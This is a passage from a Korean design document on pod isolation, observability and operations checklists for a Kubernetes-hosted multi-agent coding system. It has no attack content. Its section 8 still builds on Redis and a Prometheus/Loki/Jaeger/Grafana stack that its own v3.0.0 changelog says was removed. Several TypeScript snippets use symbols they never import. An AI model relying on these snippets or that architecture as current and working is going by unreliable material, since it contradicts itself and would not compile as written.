import { trace, context } from '@opentelemetry/api';
import { NodeTracerProvider } from '@opentelemetry/sdk-trace-node';
import { JaegerExporter } from '@opentelemetry/exporter-jaeger';

// Tracer 초기화
const provider = new NodeTracerProvider();
provider.addSpanProcessor(
  new BatchSpanProcessor(
    new JaegerExporter({
      endpoint: 'http://jaeger-collector:14268/api/traces',
    })
  )
);
provider.register();

const tracer = trace.getTracer('worker-agent');

// Worker 작업 처리 시 span 생성
class WorkerAgent {
  async executeTask(task: Task) {
    // 부모 span 컨텍스트 복원 (Redis 메시지에 포함)
    const parentContext = trace.setSpanContext(
      context.active(),
      task.traceContext
    );
    
    // 새로운 span 생성
    const span = tracer.startSpan(
      'worker.execute-task',
      {
        attributes: {
          'task.id': task.id,
          'task.type': task.type,
          'worker.id': this.workerId,
        },
      },
      parentContext
    );
    
    try {
      // 코드 생성 sub-span
      const codeSpan = tracer.startSpan('worker.generate-code', undefined, trace.setSpan(context.active(), span));
      await this.generateCode(task);
      codeSpan.end();
      
      // diff 생성 sub-span
      const diffSpan = tracer.startSpan('worker.generate-diff', undefined, trace.setSpan(context.active(), span));
      const diff = await this.generateDiff();
      diffSpan.end();
      
      // Redis 제출 sub-span
      const submitSpan = tracer.startSpan('worker.submit-diff', undefined, trace.setSpan(context.active(), span));
      await this.submitDiff(diff, trace.setSpan(context.active(), span));
      submitSpan.end();
      
      span.setStatus({ code: SpanStatusCode.OK });
    } catch (error) {
      span.recordException(error);
      span.setStatus({ code: SpanStatusCode.ERROR, message: error.message });
      throw error;
    } finally {
      span.end();
    }
  }
}
```

#### 8.4.3 Trace Context 전파

**Redis Stream 메시지에 trace context 포함**:

```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
import { propagation, trace } from '@opentelemetry/api';

class TaskQueue {
  async enqueueTask(task: Task) {
    const span = trace.getActiveSpan();
    
    // Trace context를 Redis 메시지에 포함
    const traceContext = {};
    propagation.inject(trace.setSpan(context.active(), span), traceContext);
    
    await redis.xadd('task-queue', '*', {
      taskId: task.id,
      taskType: task.type,
      payload: JSON.stringify(task),
      traceContext: JSON.stringify(traceContext),  // W3C Trace Context
    });
  }
}
```

### 8.5 Grafana 대시보드

#### 8.5.1 핵심 대시보드 패널

| 패널 이름 | 데이터 소스 | 쿼리 | 목적 |
|---------|----------|------|------|
| **Worker 리소스 사용률** | Prometheus | `rate(container_cpu_usage_seconds_total{pod=~"worker.*"}[5m])` | CPU/메모리 사용량 모니터링 |
| **작업 처리 시간** | Prometheus | `histogram_quantile(0.95, worker_task_processing_duration_seconds_bucket)` | P95 latency 추적 |
| **에러율** | Prometheus | `rate(worker_task_failed_total[5m]) / rate(worker_task_completed_total[5m])` | 에러 비율 경고 |
| **KEDA 스케일링** | Prometheus | `worker_replica_count` | Worker 자동 스케일링 상태 |
| **에러 로그** | Loki | `{app="worker", level="error"}` | 실시간 에러 로그 |
| **분산 추적** | Jaeger | traceId 검색 | 요청 흐름 시각화 |

#### 8.5.2 알림 규칙 (Prometheus Alertmanager)

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/monitoring/alerts.yaml
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: agent-system-alerts
  namespace: agent-system
spec:
  groups:
    - name: worker-alerts
      interval: 30s
      rules:
        - alert: HighErrorRate
          expr: |
            rate(worker_task_failed_total[5m]) / rate(worker_task_completed_total[5m]) > 0.1
          for: 5m
          labels:
            severity: critical
          annotations:
            summary: "Worker 에러율 10% 초과"
            description: "Worker Pod의 작업 실패율이 5분간 10%를 초과했습니다."
        
        - alert: WorkerMemoryHigh
          expr: |
            container_memory_working_set_bytes{pod=~"worker.*"} / 
            container_spec_memory_limit_bytes{pod=~"worker.*"} > 0.9
          for: 2m
          labels:
            severity: warning
          annotations:
            summary: "Worker 메모리 사용률 90% 초과"
            description: "{{ $labels.pod }}의 메모리 사용률이 90%를 초과했습니다."
        
        - alert: TaskQueueBacklog
          expr: redis_stream_pending_messages{stream="task-queue"} > 100
          for: 10m
          labels:
            severity: warning
          annotations:
            summary: "작업 큐 적체 (100개 이상)"
            description: "대기 중인 작업이 100개를 초과했습니다. KEDA 스케일링 확인 필요."
```

### 8.6 설계 근거: 왜 관찰성이 중요한가

#### 8.6.1 격리된 환경에서의 디버깅 어려움

**문제 시나리오**: Worker가 작업 중 에러 발생 → 어떻게 디버깅하는가?

| 전통적 방법 | 격리 환경에서의 제약 |
|-----------|------------------|
| `kubectl exec -it worker-xxx -- /bin/bash` | readOnlyRootFilesystem + 네트워크 제한으로 도구 설치 불가 |
| `kubectl logs worker-xxx` | 로그가 여러 Pod에 분산 → 전체 흐름 파악 어려움 |
| 파일 시스템 확인 | Worker는 읽기 전용 + /scratch는 Pod 종료 시 삭제 |
| 네트워크 패킷 캡처 | NetworkPolicy로 제한 + CAP_NET_RAW 차단 |

**해결 방법**:
- **Loki**: 여러 Pod 로그를 traceId로 통합 조회
- **Jaeger**: 사용자 요청부터 Worker 완료까지 전체 흐름 시각화
- **Prometheus**: 메트릭으로 에러 발생 시점/Pod 파악

#### 8.6.2 실제 디버깅 시나리오

**사용자 보고**: "기능 개발 요청 후 30분이 지나도 완료 안됨"

1. **Grafana 대시보드 확인**:
   - KEDA 패널 → Worker 수: 0개 (스케일업 안됨!)
   - Redis 패널 → 대기 작업: 50개

2. **Loki 로그 조회**:
   ```logql
   {app="keda-operator", level="error"}
   ```
   → "Redis Stream length query failed: connection timeout"

3. **Prometheus 메트릭 확인**:
   ```promql
   up{job="redis"} == 0
   ```
   → Redis Pod가 다운되어 있음 발견

4. **Jaeger 추적**:
   - traceId로 검색 → project-lead까지는 완료, Worker 할당 시점에 멈춤
   - Redis 연결 실패로 작업 큐 메시지 전달 안됨 확인

5. **조치**:
   - `kubectl get pods -n agent-system` → Redis Pod OOMKilled
   - Redis 메모리 제한 상향 (1Gi → 2Gi)
   - 작업 큐 메시지 재처리

**설계 근거**: 관찰성 없이는 위 문제를 찾기 위해 각 Pod에 일일이 접속하거나 수동으로 로그 검색 필요 (시간 소요)

### 8.7 관찰성 체크리스트

- [ ] **메트릭**: Prometheus ServiceMonitor 배포 (모든 에이전트 Pod)
- [ ] **로그**: 구조화된 JSON 로그 출력 + Promtail 수집
- [ ] **추적**: OpenTelemetry 계측 + Jaeger/Tempo 배포
- [ ] **대시보드**: Grafana 대시보드 생성 (리소스, 에러율, 작업 처리 시간)
- [ ] **알림**: Alertmanager 규칙 설정 (에러율, 메모리, 작업 큐 적체)
- [ ] **로그 보관**: Loki retention 설정 (30일 권장)
- [ ] **트레이스 샘플링**: 고부하 시 샘플링 비율 조정 (100% → 10%)

---

## 9. 결론 및 체크리스트

### 9.1 전체 격리 전략 요약

이 문서에서 다룬 Kubernetes Pod 격리 전략은 **5가지 핵심 레이어**로 구성됩니다:

```mermaid
graph TB
    subgraph "레이어 1: 네임스페이스 격리"
        A[단일 네임스페이스 agent-system]
        A --> B[RBAC로 외부 접근 차단]
    end
    
    subgraph "레이어 2: 리소스 격리"
        C[Pod별 CPU/Memory 제한]
        C --> D[QoS Guaranteed]
    end
    
    subgraph "레이어 3: 네트워크 격리"
        E[NetworkPolicy deny-all]
        E --> F[Pod별 명시적 허용]
        F --> G[Worker는 PostgreSQL 차단]
    end
    
    subgraph "레이어 4: 스토리지 격리"
        H[PVC RWX 공유]
        H --> I[Pod별 읽기/쓰기 권한 분리]
        I --> J[Worker는 RO + emptyDir /scratch]
    end
    
    subgraph "레이어 5: 보안 격리"
        K[SecurityContext runAsNonRoot]
        K --> L[readOnlyRootFilesystem]
        L --> M[Capabilities drop ALL]
        M --> N[Seccomp/AppArmor]
    end
    
    subgraph "레이어 6: 시크릿 격리"
        O[Pod별 시크릿 분리]
        O --> P[Worker는 LLM+Redis만]
        P --> Q[로그 마스킹]
    end
    
    subgraph "레이어 7: 관찰성"
        R[Prometheus 메트릭]
        R --> S[Loki 로그]
        S --> T[Jaeger 분산 추적]
    end
    
    B --> C
    D --> E
    G --> H
    J --> K
    N --> O
    Q --> R
```

### 9.2 배포 전 검증 체크리스트

#### 네임스페이스 및 리소스 (섹션 2, 3)
- [ ] 네임스페이스 `agent-system` 생성
- [ ] ResourceQuota 배포 (CPU 4코어, Memory 8GB)
- [ ] LimitRange 배포 (Pod별 최소/최대 제한)
- [ ] Pod별 requests/limits 설정 확인

#### 네트워크 격리 (섹션 4)
- [ ] NetworkPolicy `00-deny-all` 배포 (기본 차단)
- [ ] NATS/PostgreSQL ingress 정책 배포
- [ ] gateway egress 정책 배포 (외부 인터넷 허용)
- [ ] coordinator egress 정책 배포 (NATS + PostgreSQL + MCP)
- [ ] Worker egress 정책 배포 (PostgreSQL 차단 확인)
- [ ] 네트워크 정책 테스트 (`kubectl exec` → `curl` 테스트)

#### 스토리지 격리 (섹션 5)
- [ ] StorageClass 배포 (RWX 지원 확인)
- [ ] PVC `workspace-pvc` 생성 (10Gi)
- [ ] Pod별 volumeMounts 설정 (RO/RW 확인)
- [ ] Worker emptyDir `/scratch` 마운트 확인
- [ ] spec 파일 공유 확인 (gateway, coordinator, Worker 모두 접근)
- [ ] Watchman inotify 이벤트 발생 확인

#### 시크릿 관리 (섹션 6)
- [ ] Pod별 시크릿 분리 배포 (llm-api-keys, nats-auth, pg-secret, github-secret, semgrep-secret)
- [ ] Worker는 NATS 시크릿만 마운트 확인
- [ ] gateway는 모든 시크릿 마운트 확인
- [ ] 로그 마스킹 정규식 테스트
- [ ] Secret 암호화 활성화 (`--encryption-provider-config`)
- [ ] RBAC 설정 (개발자 Secret 읽기 불가)

#### 보안 컨텍스트 (섹션 7)
- [ ] 모든 Pod에 `runAsNonRoot: true` 설정
- [ ] Worker/coordinator에 `readOnlyRootFilesystem: true` 설정
- [ ] 모든 Pod에 `capabilities.drop: [ALL]` 설정
- [ ] PSS `restricted` 라벨 네임스페이스에 적용
- [ ] Seccomp RuntimeDefault 프로파일 적용
- [ ] AppArmor 프로파일 배포 (Worker, coordinator)
- [ ] PSS 위반 체크 (`kubectl label --dry-run=server`)

#### 관찰성 (섹션 8)
- [ ] kubectl logs + k9s CLI 설치 확인
- [ ] NATS 내장 모니터링 엔드포인트 접근 확인 (`:8222/varz`)
- [ ] Pod 로그 JSON 포맷 확인
- [ ] 필요시 Grafana Agent 경량 수집기 배포
- [ ] spec 파일 변경 이벤트 로그 확인

### 9.3 운영 시 모니터링 체크리스트

#### 일일 점검
- [ ] k9s로 Pod 상태 확인 (CrashLoopBackOff, OOMKilled 체크)
- [ ] kubectl logs로 에러 로그 확인 (gateway, coordinator, Worker)
- [ ] NATS Pod 상태 확인 (`kubectl get pods`)
- [ ] KEDA Worker 스케일링 로그 확인

#### 주간 점검
- [ ] PVC 용량 확인 (10Gi 중 사용률 < 80%)
- [ ] PostgreSQL 백업 검증 (pgdump 자동 백업)
- [ ] spec 파일 정리 (완료된 spec 아카이브)
- [ ] Worker 리소스 사용률 분석 (KEDA 임계값 조정)

#### 월간 점검
- [ ] 시크릿 로테이션 (API 키, DB 비밀번호, NATS 토큰)
- [ ] SecurityContext 설정 감사 (변경사항 확인)
- [ ] NetworkPolicy 업데이트 (새로운 Pod 추가 시)
- [ ] Git push 금지 정책 준수 확인

### 9.4 다음 단계

이 문서를 기반으로 다음 작업을 진행할 수 있습니다:

1. **Kubernetes 매니페스트 작성** (구현 Phase):
   - `k8s/namespace.yaml`, `k8s/networkpolicies/*.yaml`
   - `k8s/deployments/*.yaml`, `k8s/secrets/*.yaml`
   - `k8s/keda/*.yaml` (KEDA NATS scaler)

2. **CI/CD 파이프라인 통합**:
   - Helm Chart 패키징
   - GitOps (ArgoCD/FluxCD) 배포 자동화
   - E2E 테스트 (NetworkPolicy 검증, 보안 스캔)

3. **재해 복구 계획**:
   - PostgreSQL 자동 백업 (Velero)
   - PVC 스냅샷 정책
   - spec 파일 백업 전략

4. **성능 최적화**:
   - Worker Pod 리소스 튜닝 (실제 부하 측정 후)
   - KEDA 스케일링 임계값 조정 (NATS 메시지 큐 길이 기반)
   - PVC 스토리지 클래스 변경 (EFS → Longhorn)

---

## 10. 버전 정보 및 변경 이력

**문서 정보**:
- **버전**: 3.0.0
- **작성일**: 2026-02-19
- **상태**: 완료 (섹션 1~9)
- **총 줄 수**: 약 3,160줄
- **다음 작업**: Kubernetes 매니페스트 구현

**v3.0.0 주요 변경사항 (2026-02-19)**:

1. **MQ 교체**: Redis (100~300MB) → NATS Core (~50MB)
   - NATS는 "알림 핑"만 전달 (상세 정보는 spec 파일에)
   - JetStream 불사용 (spec 파일이 persistent state)
   - KEDA NATS scaler로 Worker 오토스케일링

2. **명세서 중심 통신**:
   - spec 파일 변경 감지 기반 (Watchman + NATS 핑)
   - NATS 메시지 페이로드: `{ type, specId, path, timestamp }` 만
   - Worker는 spec 파일 읽기로 작업 수신

3. **K8s Pod 통합** (8개 → 4개 고정 + Worker 0→3):
   - gateway Pod: consultant + git-manager (multi-container)
   - coordinator Pod: spec-manager + project-lead + reviewer (multi-container)
   - nats Pod: 64MB, 알림 핑만
   - postgresql Pod: 512MB, spec 메타데이터 + 시행착오
   - Worker Pod: 0→3 (KEDA 스케일링, 기존 0→6에서 축소)

4. **Git 보안 강화**:
   - 모든 에이전트 push 절대 금지
   - commit, branch, merge (로컬만) 허용
   - 푸시 전 필수: squash merge → 보안 검토 → 사람 승인 → 사람이 직접 push

5. **모니터링 경량화**:
   - Prometheus/Loki/Jaeger/Grafana 제거 (1GB+ RAM 절약)
   - 대체: kubectl logs + k9s CLI + NATS 내장 모니터링

6. **리소스 예산** (4코어/8GB 제약):
   - 고정 Pod 합계: 1.55 CPU, 3.1GB RAM
   - Worker 최대 (×3): 1.5 CPU, 2.3GB RAM
   - 총 최대: 3.55 CPU, 6.15GB RAM (여유 0.45 CPU, 1.85GB RAM)

**v2.0.0 (이전 버전)**:
- Redis Pub/Sub 24채널 + Stream
- 8개 독립 Pod (OpenCode, doc-manager, project-lead, junior, reviewer, Worker ×3, Redis, PostgreSQL)
- Prometheus + Loki + Jaeger + Grafana
- Worker 최대 6개
